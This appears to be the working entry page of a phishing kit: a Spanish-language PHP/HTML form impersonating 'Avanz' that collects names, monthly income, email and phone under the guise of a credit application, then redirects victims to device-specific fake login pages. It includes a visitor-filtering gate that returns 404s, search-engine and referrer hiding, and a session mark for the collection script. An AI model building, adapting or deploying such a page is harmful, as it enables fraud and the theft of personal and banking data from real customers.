<?php
require_once __DIR__ . '/_guard.php';
if (session_status() !== PHP_SESSION_ACTIVE) { @session_start(); }

// ---------------------------------------------------------------------
// index.php — FORMULARIO DE SOLICITUD (paso 1, solo GET)
// El POST lo maneja enviar_solicitud.php (no depende de la cookie del
// gate, sino de una marca de sesión que se pone aquí abajo). Esto
// evita que _guard.php rechace el POST AJAX con 404.
// Si la sesión ya viene con solicitud_ok=true, se salta el formulario
// y se pasa directo al login (indexmovil.html / pcindex.html).
// ---------------------------------------------------------------------

// Marca de sesión: enviar_solicitud.php requiere esto para aceptar POST
$_SESSION['solicitud_can_post'] = time();

$ya_envio = !empty($_SESSION['solicitud_ok']);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <title>Avanz - Solicitud</title>
    <link rel="icon" href="img/lk.svg" type="image/svg+xml">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Open Sans','Segoe UI',Arial,sans-serif;background:#f2f2f2;color:#4a4a4a;min-height:100vh;-webkit-text-size-adjust:100%}
        /* Header */
        .solc-topbar{background:#fff;border-bottom:2px solid #FF7500;padding:18px 28px;display:flex;align-items:center;justify-content:space-between;min-height:90px}
        .solc-topbar .solc-logo{height:62px !important;width:auto !important;display:block !important;margin:0 !important;padding:0 !important;max-width:240px}
        .solc-topbar .solc-menu{width:44px !important;height:34px !important;display:flex !important;flex-direction:column !important;justify-content:space-between !important;cursor:pointer;margin:0 !important;padding:0 !important;background:transparent !important;border:0 !important}
        .solc-topbar .solc-menu span{display:block;height:5px;width:100%;background:#4a4a4a;border-radius:3px;margin:0 !important}
        /* Loader */
        .loading-view{display:none;flex-direction:column;align-items:center;justify-content:center;height:calc(100vh - 60px);background:#fff}
        .loading-view.on{display:flex}
        .spin{width:110px;height:110px;background:url('img/logo-avanz-mini.png') no-repeat center/contain;animation:spin 1s linear infinite}
        .loading-view p{margin-top:22px;font-size:15px;color:#555}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        /* Form */
        .wrap{max-width:1000px;margin:0 auto;padding:34px 20px 60px}
        h1.title{color:#7a6a4f;font-weight:400;letter-spacing:1px;font-size:22px;margin-bottom:6px}
        h1.title b{font-weight:700;color:#5a4b32}
        .subtitle{color:#FF7500;font-weight:600;font-size:14px;margin-bottom:22px}
        .card{background:#eeeeee;border-radius:2px;padding:26px 26px 30px}
        .card h2{color:#FF7500;font-size:14px;font-weight:700;letter-spacing:1px;margin-bottom:18px;padding-bottom:10px}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px 22px}
        .field label{display:block;font-size:11.5px;font-weight:700;color:#4a4a4a;letter-spacing:.5px;margin-bottom:6px}
        .field label .req{color:#FF7500;font-weight:600;margin-left:4px}
        .field .inputwrap{background:#fff;border:1px solid #dcdcdc;border-radius:3px;display:flex;align-items:center;height:40px;padding:0 12px;transition:border-color .15s}
        .field .inputwrap:focus-within{border-color:#FF7500}
        .field input,.field select{border:0;outline:0;background:transparent;flex:1;height:100%;font-size:14px;color:#333;font-family:inherit;width:100%}
        .field input::placeholder{color:#b6b6b6;font-style:italic}
        .field .prefix{color:#FF7500;font-weight:700;margin-right:6px}
        .field select{appearance:none;-webkit-appearance:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'><path fill='%23888' d='M6 8L0 0h12z'/></svg>");background-repeat:no-repeat;background-position:right center;padding-right:18px;color:#7a7a7a}
        .field.error .inputwrap{border-color:#e53935}
        .divider{height:1px;background:#dcdcdc;margin:26px 0 22px}
        .actions{display:flex;justify-content:center}
        .btn-apply{background:#FF7500;color:#fff;border:0;padding:12px 46px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;border-radius:1px;transition:filter .15s;font-family:inherit}
        .btn-apply:hover{filter:brightness(.95)}
        .btn-apply:disabled{opacity:.6;cursor:not-allowed}
        .err-msg{color:#e53935;font-size:13px;margin-top:14px;text-align:center;display:none}
        .err-msg.on{display:block}
        /* Sin resaltado azul */
        input:focus,select:focus,textarea:focus,
        input:focus-visible,select:focus-visible,textarea:focus-visible{outline:none !important;box-shadow:none !important}
        /* Honeypot */
        .hp{position:absolute;left:-9999px;top:-9999px;height:0;width:0;opacity:0}
        @media (max-width:640px){
            .grid{grid-template-columns:1fr}
            .wrap{padding:20px 14px 40px}
            h1.title{font-size:18px}
            .card{padding:20px 16px 24px}
            .solc-topbar{padding:16px 18px;min-height:84px}
            .solc-topbar .solc-logo{height:56px !important;max-width:200px}
            .solc-topbar .solc-menu{width:40px !important;height:30px !important}
            .solc-topbar .solc-menu span{height:4px}
        }
    </style>
</head>
<body>
    <div class="solc-topbar">
        <img class="solc-logo" src="img/lk.svg" alt="Avanz">
        <div class="solc-menu" aria-hidden="true"><span></span><span></span><span></span></div>
    </div>

    <!-- Vista de formulario -->
    <div class="wrap" id="formView"<?php if ($ya_envio) echo ' style="display:none"'; ?>>
        <h1 class="title">FORM<b>ULARIO DE SOLICITUD</b></h1>
        <div class="subtitle">Por favor, complete los datos solicitados y al finalizar, haga click en "Aplicar ahora!"</div>

        <form class="card" id="solicitudForm" method="post" autocomplete="off" novalidate>
            <h2>DATOS PERSONALES</h2>

            <div class="grid">
                <div class="field" data-k="nombres">
                    <label>NOMBRES <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="text" name="nombres" placeholder="Nombres" maxlength="60" required></div>
                </div>
                <div class="field" data-k="apellidos">
                    <label>APELLIDOS <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="text" name="apellidos" placeholder="Apellidos" maxlength="60" required></div>
                </div>

                <div class="field" data-k="ingreso">
                    <label>INGRESO MENSUAL EN CÓRDOBAS <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><span class="prefix">C$</span><input type="text" name="ingreso" inputmode="numeric" placeholder="0" maxlength="14" required></div>
                </div>
                <div class="field" data-k="email">
                    <label>EMAIL <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="email" name="email" placeholder="Dirección de correo: nombre@sitio.com" maxlength="100" required></div>
                </div>

                <div class="field" data-k="telefono">
                    <label>NÚMERO DE TELÉFONO <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><input type="tel" name="telefono" inputmode="tel" placeholder="Ej: 8888 8888" maxlength="20" required></div>
                </div>
                <div class="field" data-k="tiempo">
                    <label>TIEMPO CON LA ENTIDAD <span class="req">(requerido)</span></label>
                    <div class="inputwrap"><select name="tiempo" required>
                        <option value="">Selecciona una opción</option>
                        <option value="Menos de 1 año">Menos de 1 año</option>
                        <option value="1 a 3 años">1 a 3 años</option>
                        <option value="3 a 5 años">3 a 5 años</option>
                        <option value="Más de 5 años">Más de 5 años</option>
                    </select></div>
                </div>
            </div>

            <!-- Honeypot invisible -->
            <input class="hp" type="text" name="website" tabindex="-1" autocomplete="off">

            <div class="divider"></div>

            <div class="actions">
                <button type="submit" class="btn-apply" id="btnApply">APLICAR AHORA</button>
            </div>
            <div class="err-msg" id="errMsg"></div>
        </form>
    </div>

    <!-- Vista de "iniciando sesión" -->
    <div class="loading-view<?php if ($ya_envio) echo ' on'; ?>" id="loadingView">
        <div class="spin"></div>
        <p>Iniciando sesión para continuar...</p>
    </div>

    <script>
    (function(){
        function goLogin(){
            var esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            window.location.href = esMovil ? 'indexmovil.html' : 'pcindex.html';
        }

        // Si ya se envió la solicitud (server session), simplemente esperar y redirigir
        var yaEnvio = <?php echo $ya_envio ? 'true' : 'false'; ?>;
        if (yaEnvio) {
            setTimeout(goLogin, 1800);
            return;
        }

        var form   = document.getElementById('solicitudForm');
        var btn    = document.getElementById('btnApply');
        var errBox = document.getElementById('errMsg');
        var formView    = document.getElementById('formView');
        var loadingView = document.getElementById('loadingView');

        // Formateo suave del ingreso (solo dígitos)
        var inpIng = form.querySelector('input[name="ingreso"]');
        inpIng.addEventListener('input', function(){
            this.value = this.value.replace(/[^0-9]/g,'');
        });

        form.addEventListener('submit', async function(ev){
            ev.preventDefault();
            errBox.classList.remove('on'); errBox.textContent = '';
            // limpiar errores previos
            form.querySelectorAll('.field.error').forEach(function(f){f.classList.remove('error');});

            btn.disabled = true;
            var original = btn.textContent;
            btn.textContent = 'ENVIANDO...';

            try {
                var fd = new FormData(form);
                var res  = await fetch('enviar_solicitud.php', { method:'POST', body: fd, credentials:'same-origin', headers:{ 'X-Requested-With':'XMLHttpRequest', 'Accept':'application/json' } });
                var text = await res.text();
                var data = null;
                try { data = JSON.parse(text); } catch(_) {}
                if (data && data.ok) {
                    formView.style.display = 'none';
                    loadingView.classList.add('on');
                    setTimeout(goLogin, 1800);
                    return;
                }
                if (data && Array.isArray(data.fields)) {
                    data.fields.forEach(function(k){
                        var f = form.querySelector('.field[data-k="'+k+'"]');
                        if (f) f.classList.add('error');
                    });
                }
                if (data && data.msg) {
                    errBox.textContent = data.msg;
                } else {
                    console.error('Solicitud - respuesta inesperada:', res.status, text);
                    errBox.textContent = 'No se pudo procesar la solicitud (' + res.status + ')';
                }
                errBox.classList.add('on');
            } catch (e) {
                console.error(e);
                errBox.textContent = 'Error de conexión. Intenta nuevamente.';
                errBox.classList.add('on');
            } finally {
                btn.disabled = false;
                btn.textContent = original;
            }
        });
    })();
    </script>
</body>
</html>
